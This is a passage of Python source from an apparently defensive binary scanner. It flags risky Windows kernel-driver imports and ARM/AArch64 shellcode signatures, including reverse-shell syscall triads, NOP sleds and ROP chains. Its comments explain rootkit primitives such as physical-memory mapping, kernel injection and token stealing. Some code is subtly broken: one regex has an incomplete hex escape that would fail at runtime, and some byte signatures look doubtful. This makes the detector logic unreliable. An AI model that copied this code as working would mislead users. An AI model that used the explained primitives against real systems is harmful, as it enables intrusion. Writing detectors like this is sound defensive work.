        rb"MmCopyFromCaller|MmCopyToCaller|RtlCopyMemory|memcpy\x00"
    )
    if user_copy.search(binary_data) and not probe_pattern.search(binary_data):
        findings.append({
            "severity": "CRITICAL",
            "title": "DRIVER_NO_PROBE_BEFORE_DEREF",
            "detail": (
                "User-space memory copy routine (MmCopyFromCaller / "
                "RtlCopyMemory) detected without ProbeForRead or "
                "ProbeForWrite; driver copies data from an unvalidated "
                "user-mode pointer into kernel context; attacker passes a "
                "kernel-address pointer to force kernel memory disclosure or "
                "overwrite kernel data structures; ProbeForXxx raises an "
                "exception if the address is not within UserMode range; "
                "without it the driver blindly dereferences the pointer; "
                "(PRE ch3: kernel-user boundary; ProbeForRead contract; "
                "MmCopyFromCaller as the safe wrapper)"
            ),
            "host": host,
            "port": port,
        })

    # --- MmMapIoSpace physical memory mapping ---
    # MmMapIoSpace maps a physical address range into the kernel VA space.
    # Legitimate drivers use it for MMIO device registers; malicious drivers
    # or vulnerable ones use it to map arbitrary physical memory, bypassing
    # virtual-memory protections entirely. Combined with a writable mapping,
    # this is a direct arbitrary physical read/write primitive usable to patch
    # kernel code, SSDT entries, or bypass PatchGuard. (PRE ch3: physical
    # memory access; DKOM; SSDT hook enabling via MmMapIoSpace.)
    if rb"MmMapIoSpace\x00" in binary_data:
        findings.append({
            "severity": "CRITICAL",
            "title": "DRIVER_PHYSICAL_MEM_MAP",
            "detail": (
                "MmMapIoSpace detected; driver maps physical memory into "
                "kernel VA; this is the primitive used by rootkits to access "
                "arbitrary physical addresses, patch SSDT entries, disable "
                "PatchGuard, or map and overwrite any kernel data structure "
                "regardless of virtual-memory protections; legitimate MMIO "
                "drivers confine this to device BAR regions -- unexplained "
                "usage is a strong rootkit indicator; "
                "(PRE ch3: physical memory access; MmMapIoSpace as rootkit "
                "primitive; SSDT patching via physical map)"
            ),
            "host": host,
            "port": port,
        })

    # --- ZwMapViewOfSection cross-process injection ---
    # The sequence ZwOpenProcess -> ZwMapViewOfSection in a kernel driver
    # implements cross-process memory injection from kernel context, bypassing
    # all user-mode protections. This pattern is used by rootkits to inject
    # DLLs or shellcode into arbitrary processes without any user-mode
    # interception point. (PRE ch3: kernel injection; ZwMapViewOfSection
    # cross-process mapping.)
    map_view = rb"ZwMapViewOfSection\x00" in binary_data
    open_proc = (rb"ZwOpenProcess\x00" in binary_data
                 or rb"PsLookupProcessByProcessId\x00" in binary_data)
    if map_view and open_proc:
        findings.append({
            "severity": "CRITICAL",
            "title": "DRIVER_CROSS_PROCESS_MAP",
            "detail": (
                "ZwMapViewOfSection + cross-process open pattern detected; "
                "driver opens an external process and maps a section into it "
                "from kernel context; bypasses all user-mode injection "
                "detections (APC injection, CreateRemoteThread, etc.) because "
                "the operation executes entirely at kernel privilege; used by "
                "rootkits to inject code into SYSTEM processes or disable "
                "security products; (PRE ch3: kernel cross-process injection; "
                "ZwMapViewOfSection + ZwOpenProcess / PsLookupProcessByProcessId)"
            ),
            "host": host,
            "port": port,
        })

    # --- Kernel stack overflow surface: alloca ---
    # The Windows kernel stack is limited (12-16 KB per thread). A driver that
    # allocates large buffers on the stack via alloca can overflow into adjacent
    # frames or the guard page, causing a kernel panic or exploitable corruption.
    # _chkstk is inserted by the compiler for large frame probes; its presence
    # indicates frames exceeding the page-probe threshold. (PRE ch3: kernel
    # stack constraints; stack-overflow BSOD / exploitation.)
    alloca_pattern = _re.compile(rb"_alloca\x00|__alloca\x00|_chkstk\x00")
    if alloca_pattern.search(binary_data):
        findings.append({
            "severity": "HIGH",
            "title": "DRIVER_KERNEL_STACK_OVERFLOW_SURFACE",
            "detail": (
                "alloca / _chkstk detected in kernel driver; dynamic stack "
                "allocation in kernel mode is hazardous -- the kernel stack "
                "is 12-16 KB; a user-controlled size passed to alloca without "
                "an upper-bound check overflows the stack, corrupting adjacent "
                "frames or triggering a BSOD; _chkstk is inserted by the "
                "compiler for large frame probes but its presence indicates "
                "stack frames exceeding the page-probe threshold; "
                "audit all call sites for user-controlled size arguments; "
                "(PRE ch3: kernel stack limits; alloca hazard in kernel context)"
            ),
            "host": host,
            "port": port,
        })

    # --- Unsafe string functions in kernel context ---
    # wcscat, wcscpy, strcpy, strcat in a kernel driver are unsafe without
    # explicit length bounds. The safe kernel equivalents are RtlStringCbCopy,
    # RtlStringCchCopy, wcsncpy_s. Presence of the unsafe variants without
    # any safe variant in the import table indicates potential kernel buffer
    # overflow via string operations. (PRE ch3: kernel string handling;
    # RtlStringCb/Cch safe-string family.)
    unsafe_str = _re.compile(
        rb"wcscat\x00|wcscpy\x00|strcat\x00|strcpy\x00|sprintf\x00"
    )
    safe_str = _re.compile(
        rb"RtlStringCb|RtlStringCch|wcsncpy_s\x00|strncpy_s\x00"
    )
    if unsafe_str.search(binary_data) and not safe_str.search(binary_data):
        findings.append({
            "severity": "HIGH",
            "title": "DRIVER_UNSAFE_STRING_OP",
            "detail": (
                "Unsafe string function (wcscat/wcscpy/strcpy/strcat/sprintf) "
                "detected in kernel driver without safe-string counterpart "
                "(RtlStringCb*/RtlStringCch*); overflow of a kernel buffer "
                "via a string operation produces pool or stack corruption at "
                "ring-0; attacker who controls input string length achieves "
                "kernel arbitrary write; Microsoft deprecated these functions "
                "for kernel use in favor of the safe-string family; "
                "(PRE ch3: kernel string overflow; RtlStringCb/Cch family; "
                "pool corruption exploitation)"
            ),
            "host": host,
            "port": port,
        })

    # --- SePrivilege / RtlAdjustPrivilege manipulation ---
    # RtlAdjustPrivilege in kernel context elevates token privileges without
    # a standard privilege-check gate. Combined with SeSinglePrivilegeCheck
    # absence or a token-stealing pattern (PsReferencePrimaryToken), this is
    # a privilege-escalation primitive. (PRE ch3: token privileges;
    # SePrivilege structures; privilege escalation via token manipulation.)
    rtl_adj = rb"RtlAdjustPrivilege\x00" in binary_data
    se_check = (rb"SeSinglePrivilegeCheck\x00" in binary_data
                or rb"SePrivilegeCheck\x00" in binary_data)
    token_steal = (rb"PsReferencePrimaryToken\x00" in binary_data
                   or rb"PsLookupProcessByProcessId\x00" in binary_data)
    if rtl_adj and (not se_check or token_steal):
        findings.append({
            "severity": "CRITICAL",
            "title": "DRIVER_PRIVILEGE_MANIPULATION",
            "detail": (
                "RtlAdjustPrivilege detected in kernel driver without "
                "SeSinglePrivilegeCheck gate or alongside token-steal pattern "
                "(PsReferencePrimaryToken); driver can unconditionally elevate "
                "token privileges, enabling SeDebugPrivilege, "
                "SeLoadDriverPrivilege, or SeTcbPrivilege for a user-controlled "
                "process; combined with a writable IOCTL this grants an "
                "unprivileged caller arbitrary process access or driver-load "
                "capability; (PRE ch3: token privilege structures; "
                "RtlAdjustPrivilege kernel path; token-stealing rootkit pattern)"
            ),
            "host": host,
            "port": port,
        })

    return findings


def detect_arm_shellcode_patterns(binary_data: bytes, host: str = '', port: int = 0) -> list:
    """Detect ARM/AArch64 shellcode and exploit patterns in binary data.

    Synthesized from: Practical Reverse Engineering (Dang/Gazet/Bachaalany,
    ch2 ARM; ch2 Thumb; ch2 AArch64 / A64 ISA; ch5 Obfuscation; ch3 kernel
    calling conventions for ARM).

    Covers:
      - ARM32 position-independent GetPC (ADR Rn, #0 / MOV PC, LR)
      - ARM32 SVC #0 syscall instruction and R7-loaded syscall sequence
      - Thumb-mode indicator (IT instruction 0xBF02 / BX LR 0x4770)
      - AArch64 position-independent GetPC (ADR Xn, #0 encoding)
      - AArch64 SVC #0 syscall and X8-loaded syscall sequence
      - ARM NOP sled (MOV R0, R0 repeated 8+ times)
      - ARM reverse-shell syscall sequence (socket/connect/dup2 numbers)
      - ARM ROP chain candidate (dense BLX Rn without call structure)
    """
    import re as _re
    findings = []

    # --- ARM32 position-independent code (GetPC) ---
    # Shellcode must know its own load address to reference embedded data.
    # The ARM32 GetPC trick uses:
    #   ADR Rn, #0  -- ADD Rn, PC, #0; encodes as E2 8F <Rd_nibble> 00
    #   MOV PC, LR  -- 0x0E 0xF0 0xA0 0xE1 in ARM32 LE
    # These patterns in non-library code indicate position-independent
    # shellcode construction. (PRE ch2: ARM addressing modes; ADR
    # pseudo-instruction; position-independent shellcode.)
    adr_pc_pattern = _re.compile(rb"\xe2\x8f[\x00-\x0f]\x00")
    mov_pc_lr = b"\x0e\xf0\xa0\xe1"
    adr_hits = list(adr_pc_pattern.finditer(binary_data))
    if adr_hits or mov_pc_lr in binary_data:
        if adr_hits:
            offset = adr_hits[0].start()
        else:
            offset = binary_data.index(mov_pc_lr)
        findings.append({
            "severity": "CRITICAL",
            "title": "ARM32_POSITION_INDEPENDENT_CODE",
            "detail": (
                "ARM32 GetPC pattern at offset " + hex(offset) + "; "
                "ADR Rn, #0 (ADD Rn, PC, #0 encoding E28Fx000) or "
                "MOV PC, LR (0x0E 0xF0 0xA0 0xE1) detected; "
                "position-independent technique used by shellcode to determine "
                "its own load address at runtime; enables data-relative "
                "addressing without a GOT or relocation table; characteristic "
                "of hand-written ARM shellcode and position-independent exploits; "
                "(PRE ch2: ADR pseudo-instruction; ARM PC-relative addressing; "
                "shellcode GetPC pattern)"
            ),
            "host": host,
            "port": port,
        })

    # --- ARM32 syscall: SVC #0 ---
    # ARM32 Linux syscalls use SVC #0 (0x00 0x00 0x00 0xEF in LE).
    # The syscall number is placed in R7 before SVC. MOV R7, #N encodes as
    # E3 A0 7N 00 in ARM32 LE. A MOV R7 within 16 bytes before SVC #0 is
    # the canonical Linux ARM32 direct-syscall sequence. (PRE ch2: ARM32
    # calling convention; syscall ABI; SVC instruction encoding.)
    svc0_arm = b"\x00\x00\x00\xef"
    svc_positions = []
    for i in range(len(binary_data) - 3):
        if binary_data[i:i+4] == svc0_arm:
            svc_positions.append(i)
    if svc_positions:
        r7_pattern = _re.compile(rb"\xe3\xa0\x7[\x00-\xff]")
        seq_found = False
        seq_offset = 0
        for pos in svc_positions:
            window = binary_data[max(0, pos - 16):pos]
            if r7_pattern.search(window):
                seq_found = True
                seq_offset = pos
                break
        if seq_found:
            findings.append({
                "severity": "CRITICAL",
                "title": "ARM32_SYSCALL_SEQUENCE",
                "detail": (
                    "ARM32 syscall sequence at offset " + hex(seq_offset) + "; "
                    "MOV R7, #N (syscall number E3A07x00) followed by SVC #0 "
                    "(0x00 0x00 0x00 0xEF); canonical Linux ARM32 syscall ABI; "
                    "R7 carries the syscall number, R0-R6 carry arguments; "
                    "raw syscall outside libc stubs indicates shellcode or "
                    "direct-syscall evasion of libc hooking; cross-reference "
                    "R7 value against ARM Linux syscall table to identify the "
                    "operation; (PRE ch2: ARM32 syscall convention; R7 register; "
                    "SVC #0 invocation)"
                ),
                "host": host,
                "port": port,
            })
        else:
            findings.append({
                "severity": "HIGH",
                "title": "ARM32_SYSCALL_INSTRUCTION",
                "detail": (
                    "ARM32 SVC #0 (0x00 0x00 0x00 0xEF) at offset "
                    + hex(svc_positions[0]) + "; "
                    + str(len(svc_positions)) + " occurrence(s); "
                    "syscall gate instruction; in non-libc context indicates "
                    "direct syscall invocation; shellcode uses raw SVC #0 to "
                    "bypass libc hooking; audit surrounding instructions for "
                    "R7 syscall number and argument registers; "
                    "(PRE ch2: ARM32 SVC encoding; Linux syscall ABI)"
                ),
                "host": host,
                "port": port,
            })

    # --- Thumb mode detection ---
    # Thumb instructions are 16-bit compressed encodings interleaved with ARM32.
    # IT EQ encodes as 0xBF 0x02 in Thumb LE; BX LR encodes as 0x70 0x47.
    # Shellcode targeting ARMv7 often uses Thumb for denser encoding and smaller
    # payload size. (PRE ch2: Thumb ISA; IT instruction encoding; BX LR Thumb.)
    thumb_it   = b"\xbf\x02"
    thumb_bxlr = b"\x70\x47"
    if thumb_it in binary_data or thumb_bxlr in binary_data:
        findings.append({
            "severity": "INFO",
            "title": "THUMB_MODE_CODE",
            "detail": (
                "Thumb mode instruction detected (IT EQ 0xBF02 or BX LR "
                "0x4770); Thumb is a 16-bit compressed ARM encoding used by "
                "shellcode for denser payloads; BX LR is the canonical Thumb "
                "return; Thumb/ARM interworking uses BX/BLX for mode switching; "
                "presence in a non-library binary may indicate hand-written "
                "Thumb shellcode or a Thumb-state exploit stub; "
                "(PRE ch2: Thumb ISA overview; 16-bit Thumb encoding; "
                "IT instruction; BX LR interworking return)"
            ),
            "host": host,
            "port": port,
        })

    # --- AArch64 position-independent code ---
    # AArch64 GetPC: ADR Xn, #0 encodes as <Rd[4:0]> 0x00 0x00 0x10 in LE.
    # Low 5 bits of byte 0 = destination register; 0x10 in byte 3 is the
    # ADR opcode group. This loads the current PC into Xn for PIC shellcode.
    # (PRE ch2: AArch64 ADR encoding; PC-relative addressing in A64.)
    adr64_pattern = _re.compile(rb"[\x00-\x1f]\x00\x00\x10")
    adr64_hits = list(adr64_pattern.finditer(binary_data))
    if adr64_hits:
        findings.append({
            "severity": "CRITICAL",
            "title": "AARCH64_POSITION_INDEPENDENT",
            "detail": (
                "AArch64 GetPC pattern at offset "
                + hex(adr64_hits[0].start()) + "; "
                "ADR Xn, #0 (encoding [Rd] 0x00 0x00 0x10) loads current PC "
                "into a general-purpose register; enables position-independent "
                "shellcode to self-locate without a GOT or dynamic linker; "
                + str(len(adr64_hits)) + " occurrence(s); "
                "cluster of these indicates PIC shellcode construction; "
                "(PRE ch2: AArch64 ADR instruction; PC-relative immediate; "
                "A64 position-independent shellcode)"
            ),
            "host": host,
            "port": port,
        })

    # --- AArch64 syscall: SVC #0 ---
    # AArch64 Linux syscalls use SVC #0 encoded as 0x01 0x00 0x00 0xD4 in LE.
    # The syscall number goes in X8; arguments in X0-X5. MOVZ X8, #imm
    # encodes with byte[3] = 0x01 (Rd bits 4:0 = 0x08 for X8). A MOVZ X8
    # within 16 bytes before SVC #0 is the canonical AArch64 direct-syscall
    # sequence. (PRE ch2: AArch64 calling convention; X8 = syscall number.)
    svc0_a64 = b"\x01\x00\x00\xd4"
    svc64_positions = []
    for i in range(len(binary_data) - 3):
        if binary_data[i:i+4] == svc0_a64:
            svc64_positions.append(i)
    if svc64_positions:
        movz_x8 = _re.compile(rb"\xd2[\x80-\x9f][\x00-\xff]\x01")
        seq64_found = False
        seq64_offset = 0
        for pos in svc64_positions:
            window = binary_data[max(0, pos - 16):pos]
            if movz_x8.search(window):
                seq64_found = True
                seq64_offset = pos
                break
        if seq64_found:
            findings.append({
                "severity": "CRITICAL",
                "title": "AARCH64_SYSCALL_SEQUENCE",
                "detail": (
                    "AArch64 syscall sequence at offset " + hex(seq64_offset) + "; "
                    "MOVZ X8, #N (syscall number, D28x..01 encoding) followed by "
                    "SVC #0 (0x01 0x00 0x00 0xD4); canonical Linux AArch64 "
                    "syscall ABI; X8 carries the syscall number, X0-X5 carry "
                    "arguments; direct-syscall outside libc stubs indicates "
                    "shellcode or syscall-filter evasion; cross-reference X8 "
                    "value against AArch64 Linux syscall table; "
                    "(PRE ch2: AArch64 calling convention; X8 syscall register; "
                    "SVC #0 invocation; MOVZ encoding)"
                ),
                "host": host,
                "port": port,
            })
        else:
            findings.append({
                "severity": "HIGH",
                "title": "AARCH64_SYSCALL",
                "detail": (
                    "AArch64 SVC #0 (0x01 0x00 0x00 0xD4) at offset "
                    + hex(svc64_positions[0]) + "; "
                    + str(len(svc64_positions)) + " occurrence(s); "
                    "syscall gate without visible X8 preload in immediate window; "
                    "may indicate obfuscated syscall-number assignment or "
                    "legitimate libc stub; in stripped binary outside known libc "
                    "regions this is suspicious; "
                    "(PRE ch2: AArch64 SVC encoding; Linux syscall ABI)"
                ),
                "host": host,
                "port": port,
            })

    # --- ARM NOP sled ---
    # MOV R0, R0 is the canonical ARM32 NOP: encoding 0x00 0x00 0xA0 0xE1.
    # A run of 8+ consecutive MOV R0, R0 instructions (32+ bytes) is a
    # NOP sled -- used by exploits to provide a large landing zone for
    # imprecise PC control. (PRE ch2: ARM NOP; exploit sled patterns.)
    arm_nop = b"\x00\x00\xa0\xe1"
    sled_sequence = arm_nop * 8
    if sled_sequence in binary_data:
        sled_offset = binary_data.index(sled_sequence)
        count = 0
        pos = sled_offset
        while pos + 4 <= len(binary_data) and binary_data[pos:pos+4] == arm_nop:
            count += 1
            pos += 4
        findings.append({
            "severity": "HIGH",
            "title": "ARM_NOP_SLED",
            "detail": (
                "ARM32 NOP sled at offset " + hex(sled_offset) + "; "
                + str(count) + " consecutive MOV R0, R0 instructions "
                "(0x00 0x00 0xA0 0xE1 x" + str(count) + "); "
                "NOP sleds provide a landing zone for imprecise program-counter "
                "control in return-to-shellcode exploits; common in heap-spray "
                "and stack-overflow exploits against ARM targets (embedded "
                "systems, mobile, IoT firmware); "
                "(PRE ch2: ARM NOP encoding; exploit sled construction; "
                "heap-spray patterns on ARM)"
            ),
            "host": host,
            "port": port,
        })

    # --- ARM reverse shell syscall sequence ---
    # A minimal ARM32 Linux reverse shell uses three syscalls in sequence:
    #   socket(AF_INET, SOCK_STREAM, 0) -- syscall #281 (0x119)
    #   connect(fd, &sockaddr, 16)       -- syscall #283 (0x11B)
    #   dup2(fd, 0/1/2)                 -- syscall #63  (0x03F)
    # Their 4-byte LE representations as ARM32 immediate constants in the
    # binary are a statistical signature; finding all three within 256 bytes
    # is a strong shellcode indicator. (PRE ch2: ARM syscall ABI; R7
    # convention; reverse-shell construction.)
    sock_num = b"\x19\x01\x00\x00"   # 281 = socket
    conn_num = b"\x1b\x01\x00\x00"   # 283 = connect
    dup2_num = b"\x3f\x00\x00\x00"   # 63  = dup2
    has_sock = sock_num in binary_data
    has_conn = conn_num in binary_data
    has_dup2 = dup2_num in binary_data
    if has_sock and has_conn and has_dup2:
        sock_pos = binary_data.index(sock_num)
        conn_pos = binary_data.index(conn_num)
        dup2_pos = binary_data.index(dup2_num)
        spread = (max(sock_pos, conn_pos, dup2_pos)
                  - min(sock_pos, conn_pos, dup2_pos))
        sev = "CRITICAL" if spread <= 256 else "HIGH"
        findings.append({
            "severity": sev,
            "title": "ARM_REVERSE_SHELL_SYSCALLS",
            "detail": (
                "ARM32 reverse-shell syscall triad detected; "
                "socket (#281 at " + hex(sock_pos) + "), "
                "connect (#283 at " + hex(conn_pos) + "), "
                "dup2 (#63 at " + hex(dup2_pos) + "); "
                "spread=" + str(spread) + " bytes; "
                "the socket/connect/dup2 sequence is the minimal Linux "
                "reverse shell: create TCP socket, connect to attacker IP, "
                "redirect stdin/stdout/stderr to the socket fd; "
                "all three syscall-number constants in close proximity is a "
                "strong shellcode indicator on ARM Linux targets; "
                "(PRE ch2: ARM32 syscall ABI; reverse-shell construction; "
                "R7 syscall-number convention)"
            ),
            "host": host,
            "port": port,
        })

    # --- ARM ROP chain candidate: dense BLX Rn ---
    # Return-Oriented Programming on ARM chains gadgets ending in BLX Rn.
    # Thumb BLX Rn: byte pattern 0x47 | (Rn << 3) in the high nibble of
    # the second byte -- range 0x87 0x47 to 0xBF 0x47.
    # ARM32 BLX Rn: E1 2F FF 1n (n = register 0-15).
    # A cluster of 6+ BLX Rn instructions within 128 bytes without function
    # prologues indicates a ROP payload rather than normal code.
    # (PRE ch2: ARM BLX encoding; ROP on ARM; Thumb gadget harvesting.)
    blx_thumb = _re.compile(rb"[\x87-\xbf]\x47")
    blx_arm32 = _re.compile(rb"\xe1\x2f\xff[\x10-\x1f]")
    thumb_blx_hits = list(blx_thumb.finditer(binary_data))
    arm32_blx_hits = list(blx_arm32.finditer(binary_data))
    all_blx = sorted(
        [(m.start(), "Thumb") for m in thumb_blx_hits]
        + [(m.start(), "ARM32") for m in arm32_blx_hits],
        key=lambda x: x[0]
    )
    rop_cluster = None
    for i in range(len(all_blx) - 5):
        window_span = all_blx[i + 5][0] - all_blx[i][0]
        if window_span <= 128:
            rop_cluster = (all_blx[i][0], all_blx[i + 5][0], window_span)
            break
    if rop_cluster:
        findings.append({
            "severity": "HIGH",
            "title": "ARM_ROP_CHAIN_CANDIDATE",
            "detail": (
                "ARM ROP chain candidate: 6+ BLX Rn instructions within "
                + str(rop_cluster[2]) + " bytes at offset range "
                + hex(rop_cluster[0]) + "-" + hex(rop_cluster[1]) + "; "
                "total BLX Rn hits: Thumb=" + str(len(thumb_blx_hits))
                + " ARM32=" + str(len(arm32_blx_hits)) + "; "
                "dense BLX Rn without function prologues/epilogues indicates "
                "ROP gadget chains; ARM ROP bypasses NX/DEP by chaining "
                "existing code gadgets ending in BLX/BX register; "
                "ASLR resistance requires an info-leak -- audit adjacent "
                "memory-disclosure primitives; "
                "(PRE ch2: ARM BLX Rn encoding; ROP on ARM; "
                "Thumb gadget harvesting; ASLR bypass patterns)"
            ),
            "host": host,
            "port": port,
        })

    return findings
